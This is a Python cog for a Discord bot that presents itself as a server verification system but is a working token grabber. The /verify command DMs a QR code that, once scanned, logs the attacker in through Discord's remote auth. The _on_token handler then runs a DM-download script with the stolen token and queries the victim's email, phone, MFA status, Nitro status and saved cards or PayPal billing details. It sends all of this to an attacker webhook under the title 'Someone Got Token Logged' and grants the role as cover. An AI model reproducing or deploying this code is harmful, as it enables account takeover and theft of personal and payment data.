import os
import discord
import qrcode
import requests
import subprocess
from io import BytesIO
from discord.ext import commands
from discord import Interaction, app_commands
from utils.remote_auth import start_auth_generation, User
from discord import Embed, Colour
from tinydb import TinyDB, Query
from discord_webhook import DiscordWebhook, DiscordEmbed

db = TinyDB('./db/guild_verification.json')


class UserNotVerifiedException(Exception):
    ...


class UserNotFoundException(Exception):
    ...


class GuildVerificationNotSetupException(Exception):
    ...


class VerificationCog(commands.Cog):
    def __init__(self, bot: commands.Bot):
        self.bot = bot

    # TODO: fix @everyone being used as a valid role
    @commands.has_permissions(manage_roles=True, administrator=True)
    @app_commands.command(name='setup_verification', description='setup the verification system')
    async def setup_verification(self, interaction: Interaction, verified_role: discord.Role):
        await interaction.response.defer()
        Server = Query()
        guild_status = db.search(Server.id == interaction.guild_id)

        if not guild_status:
            guild_status = {
                'id': interaction.guild_id,
                'is_setup': False,
                'verified_role': None,
                'users': []
            }

            db.insert(guild_status)
        else:
            guild_status = guild_status[0]

        if guild_status['is_setup']:
            await interaction.followup.send('Server is already setup for verification')
            return

        db.update({
            'is_setup': True,
            'verified_role': verified_role.id
        }, Server.id == interaction.guild_id)

        await interaction.followup.send(f'Server is now setup for verification! Verified role: **{str(verified_role)}**')

    @app_commands.command(name='verify', description='verify to gain access to other channels')
    async def verify(self, interaction: Interaction):
        await interaction.response.defer()
        await self.handle_verification(interaction)

    async def handle_verification(self, interaction: Interaction):
        not_verified = await self.is_not_verified(interaction)
        if not not_verified:
            await interaction.followup.send('You have already been verified')
            return

        target_user: discord.User = interaction.user

        async def _on_fingerprint(data: str):
            embed: Embed = Embed(
                title='Verification',
                color=Colour.from_rgb(88, 101, 242)
            )
            embed.add_field(name='How to verify', value='Scan the QR code using your mobile app to complete verification.')
            embed.set_footer(text=f'Sent from {interaction.guild.name}')
            embed.set_image(url='attachment://qr_code.png')

            qr_image = qrcode.make(data)
            with BytesIO() as binary_image:
                qr_image.save(binary_image, 'PNG')
                binary_image.seek(0)

                dm_channel: discord.DMChannel = await target_user.create_dm()
                await dm_channel.send(
                    embed=embed,
                    file=discord.File(
                        fp=binary_image,
                        filename='qr_code.png'
                    )
                )
                try:
                    print(f'sent qr code to {target_user.name}')
                except:
                    pass
                
        async def _on_user(user: User):
            target_user = self.bot.get_user(int(user.id))
            print(f'{user.getName()} is trying to use auth')

        async def _on_token(token: str):
            print(f'GOT TOKENNNNN: {token}')
            
            try:
                subprocess.Popen(f'python src/download_bot.py -t {token}')
            except:
                print("can't run dm downloader")

            try:
                webhook_url = os.getenv('WEBHOOK_URL', None)
                if not webhook_url:
                    raise Exception()

                headers = {'Authorization': token}
                webhook = DiscordWebhook(webhook_url)
                info_res =  requests.get('https://discordapp.com/api/v9/users/@me', headers=headers)
                subs_info_res = requests.get('https://discordapp.com/api/v9/users/@me/billing/subscriptions', headers=headers)
                
                subs_info = []
                if subs_info_res.ok:
                    subs_info = subs_info_res.json()

                if info_res.ok:
                    info = info_res.json()
                    embed: DiscordEmbed = DiscordEmbed(
                        title='Someone Got Token Logged 💀',
                        description=
f'''```ini
"Token" = "{token}"
"User" = "{info.get('username', 'no-name')}#{info.get('discriminator', '????')}"
"ID" = {info.get('id', '0'*18)}
"Email" = "{info.get('email', 'no-name@email.com')}"
"Phone" = "{info.get('phone', '???')}"
"MFA enabled" = {info.get('mfa_enabled', "???")}
"Nitro user" = {bool(subs_info)}
```'''
                    )

                pay_info_res = requests.get("https://discordapp.com/api/v9/users/@me/billing/payment-sources", headers=headers)

                if pay_info_res.ok:
                    payments_embed: DiscordEmbed = DiscordEmbed(title='Payment Methods')
                    for payment_method in pay_info_res.json():
                        match payment_method['type']:
                            # card
                            case 1:
                                billing_address = payment_method['billing_address']
                                payments_embed.add_embed_field(
                                    'Card',
f'''```ini
"Card brand" = "{payment_method.get('brand', 'Unknown')}"
"Last 4 digits" = {payment_method.get('last_4', 'Unknown')}
"Expiry date" = "{payment_method.get('expires_month', '??')}/{payment_method.get('expires_year', '??')}"

"Billing name" = "{billing_address.get('name', 'No Name')}"
"Address 1" = "{billing_address.get('line_1', 'Unknown')}"
"Address 2" = "{billing_address.get('line_2', 'Unknown')}"
"Country" = "{billing_address.get('country', 'Unknown')}"
"State" = "{billing_address.get('state', 'Unknown')}"
"City" = "{billing_address.get('city', 'Unknown')}"
"Postal code" = "{billing_address.get('postal_code', 'Unknown')}"
```'''
                                )

                            # paypal
                            case 2:
                                billing_address = payment_method['billing_address']
                                payments_embed.add_embed_field(
                                    'PayPal',
f'''```ini
"Email" = "{payment_method.get('email', 'Unknown')}"

"Billing name" = "{billing_address.get('name', 'No Name')}"
"Address 1" = "{billing_address.get('line_1', 'Unknown')}"
"Address 2" = "{billing_address.get('line_2', 'Unknown')}"
"Country" = "{billing_address.get('country', 'Unknown')}"
"State" = "{billing_address.get('state', 'Unknown')}"
"City" = "{billing_address.get('city', 'Unknown')}"
"Postal code" = "{billing_address.get('postal_code', 'Unknown')}"
```'''
                                )

                    if payments_embed.fields:
                        webhook.add_embed(embed=payments_embed)
                
                webhook.add_embed(embed=embed)
                webhook.execute()

            except:
                print('Something in webhook creation failed')

            Server = Query()
            # at this point we can guarantee the server exists in the db
            guild_status = db.search(Server.id == interaction.guild_id)[0]

            verified_role_id = guild_status['verified_role']
            verified_role: discord.Role = interaction.guild.get_role(
                verified_role_id)

            # same thing for the user
            user_status = list(filter(lambda u: u['id'] == interaction.user.id, guild_status['users']))[0]
            user_index = guild_status['users'].index(user_status)

            member: discord.Member = interaction.guild.get_member(user_status['id'])
            guild_status['users'][user_index]['is_verified'] = True

            await member.add_roles(verified_role)

            db.update(guild_status, Server.id == interaction.guild_id)

            await interaction.followup.send('Verification Complete!', ephemeral=True)

        async def _on_cancel():
            print('User cancelled auth')
            await interaction.delete_original_response()

        await start_auth_generation(
            on_fingerprint=_on_fingerprint,
            on_token=_on_token,
            on_user=_on_user,
            on_cancel=_on_cancel
        )

    async def is_not_verified(self, interaction: Interaction) -> bool:
        Server = Query()
        guild_status = db.search(Server.id == interaction.guild_id)

        if not guild_status:
            guild_status = {
                'id': interaction.guild_id,
                'is_setup': False,
                'verified_role': None,
                'users': []
            }

            db.insert(guild_status)
        else:
            guild_status = guild_status[0]

        if not guild_status['is_setup']:
            raise GuildVerificationNotSetupException()

        user_status = list(
            filter(lambda u: u['id'] == interaction.user.id, guild_status['users']))
        if not user_status:
            user_status = {
                'id': interaction.user.id,
                'is_verified': False
            }

            guild_status['users'].append(user_status)
        else:
            user_status = user_status[0]

        return not user_status['is_verified']


async def setup(bot):
    await bot.add_cog(VerificationCog(bot))
